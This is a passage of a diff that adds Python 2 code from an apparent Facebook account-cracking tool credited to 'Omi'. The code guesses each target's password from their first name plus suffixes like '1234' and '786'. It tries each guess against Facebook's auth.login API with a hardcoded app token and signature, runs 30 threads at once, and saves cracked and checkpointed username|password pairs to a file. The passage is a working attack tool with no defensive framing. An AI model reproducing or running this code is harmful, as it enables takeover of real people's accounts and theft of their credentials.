+												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass5
+												oks.append(user+pass5)
+											else:
+												if 'www.facebook.com' in q["error_msg"]:
+													print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass5
+													cek = open("out/checkpoint.txt", "a")
+													cek.write(user+"|"+pass5+"\n")
+													cek.close()
+													cekpoint.append(user+pass5)
+												else:
+													pass6 = b['first_name'] + '1234'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load(data)
+													if 'access_token' in q:
+														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass6
+														oks.append(user+pass6)
+													else:
+														if 'www.facebook.com' in q["error_msg"]:
+															print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass6
+															cek = open("out/checkpoint.txt", "a")
+															cek.write(user+"|"+pass6+"\n")
+															cek.close()
+															cekpoint.append(user+pass6)
+														else:
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads(a.text)
+															pass7 = b['first_name'] + '786'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load(data)
+															if 'access_token' in q:
+																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass7
+																oks.append(user+pass7)
+															else:
+																if 'www.facebook.com' in q["error_msg"]:
+																	print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass7
+																	cek = open("out/checkpoint.txt", "a")
+																	cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+																	cekpoint.append(user+pass7)
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	print "  \033[1;91m«---------Developed By Omi------------»"
+	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
+	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print("\033[1;92mCP File Has Been Saved\033[1;92m:\033[1;97mout/checkpoint.txt")
+	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	menu()
+
+if __name__ == '__main__':
+	login()
